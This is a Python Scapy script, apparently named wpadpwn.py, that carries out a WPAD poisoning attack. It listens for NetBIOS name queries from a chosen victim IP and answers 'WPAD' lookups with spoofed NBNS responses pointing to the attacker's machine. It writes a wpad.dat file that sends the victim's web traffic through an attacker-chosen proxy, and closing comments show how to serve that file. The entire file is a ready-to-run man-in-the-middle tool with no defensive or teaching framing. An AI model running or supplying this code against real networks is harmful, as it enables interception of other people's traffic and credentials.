import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
import threading

def get_mac_ip_for_interface(ifname):
	from subprocess import Popen, PIPE
	rx = re.compile(".*HWaddr\s+(?P<the_mac>[^\s]+).*inet addr:(?P<the_ip>[^\s]+)")
	pid = Popen(["ifconfig", ifname], stdout=PIPE)
	s = pid.communicate()[0]
	the_ip_mac = rx.match(s.replace("\n", " "))
	if the_ip_mac:
		return the_ip_mac.group("the_ip"), the_ip_mac.group("the_mac")
	return None, None

def wpad_nb_response(pkt, srcip, srcmac):
	dstmac = pkt.src
	dstip = pkt.getlayer(IP).src

	packet   = Ether(dst=dstmac, src=srcmac)
	packet  /= IP(dst=dstip, src=srcip)
	packet  /= UDP(sport=137, dport=137)
	packet  /= NBNSQueryResponse( NAME_TRN_ID= pkt.getlayer(NBNSQueryRequest).NAME_TRN_ID,\
	                              FLAGS=0x8500,\
	                              QDCOUNT=0,\
	                              ANCOUNT=1,\
	                              NSCOUNT=0,\
	                              ARCOUNT=0,\
	                              RR_NAME= 'WPAD           ',\
	                              SUFFIX = "workstation",\
	                              NULL=0,\
	                              QUESTION_TYPE="NB",\
	                              QUESTION_CLASS="INTERNET",\
	                              TTL=259200,\
	                              RDLENGTH=6,\
	                              NB_FLAGS=0,\
	                              NB_ADDRESS=srcip)
	sendp(packet, verbose=0)
	print "sent nb response to:", dstip

if __name__ == '__main__':
	the_victim_ip = sys.argv[1]
	the_proxy_ip_port = sys.argv[2]
	listen_local_iface = sys.argv[3]

	the_wpad_ip, the_wpad_mac = get_mac_ip_for_interface(listen_local_iface)
	print "Using", the_wpad_ip, the_wpad_mac, "for injection"

	with open("wpad.dat", "w") as wpad_out:
		wpad_out.write( """function FindProxyForURL(url, host)\n{\nreturn "PROXY """ + the_proxy_ip_port + '";\n}\n')

	while True:
		packets = sniff(filter="udp and port 137", count=1)
		pkt = packets[0]
		try:
			name = pkt.getlayer("NBNS query request").QUESTION_NAME
		except AttributeError, aerr: continue#it's not a query
		src_ip = pkt.getlayer(IP).src
		print "[*] ", src_ip, name
		if src_ip == the_victim_ip and 'wpad' in name.lower():
			wpad_nb_response(pkt, the_wpad_ip, the_wpad_mac)

# sudo pkill -f *wpadpwn.py && python wpadpwn.py
# sudo python -m SimpleHTTPServer 80


